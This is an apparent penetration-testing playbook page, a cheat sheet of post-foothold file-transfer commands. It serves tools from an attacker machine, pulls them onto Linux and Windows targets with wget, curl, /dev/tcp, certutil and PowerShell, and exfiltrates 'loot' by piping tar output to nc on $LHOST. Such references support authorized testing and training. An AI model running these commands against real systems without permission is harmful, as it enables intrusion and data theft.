---
summary: Move tools onto a target and loot off it — HTTP, SMB, nc, base64, and living-off-the-land binaries.
status: active
tags: [security, playbook, file-transfer]
private: false
---

# File Transfer

After a foothold you need enum scripts on the box and loot back off it. Pick the method the box's tooling allows.

## Serve from attacker

```bash
python3 -m http.server 80              # HTTP
impacket-smbserver share . -smb2support   # SMB (Windows-friendly)
# for auth'd SMB: impacket-smbserver share . -user u -password p -smb2support
```

## Pull onto Linux target

```bash
wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
curl http://$LHOST/lp.sh -o /tmp/lp.sh
# no wget/curl:
exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /f GET" >&3; cat <&3
```

## Pull onto Windows target

```powershell
certutil -urlcache -f http://%LHOST%/nc.exe nc.exe
powershell -c "iwr http://$LHOST/w.exe -o w.exe"
copy \\$LHOST\share\tool.exe .          # SMB
```

## Exfil loot back

```bash
# on attacker
nc -lvnp 443 > loot.tar
# on target
tar czf - /interesting | nc $LHOST 443
# tiny files: base64 the file, paste, base64 -d on the other side
```

## No network / weird channels

- `base64 -w0 file` → copy through the shell → decode.
- ICMP/DNS exfil when TCP is filtered.
- Shared mounts (NFS, Docker volumes) — e.g. Bedsides bridged container→host via the shared `/datastore` volume.

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [Reverse Shells & Payloads](kb://11-security-playbook-reverse-shells)
- [Pivoting & Tunneling](kb://11-security-playbook-pivoting-tunneling)
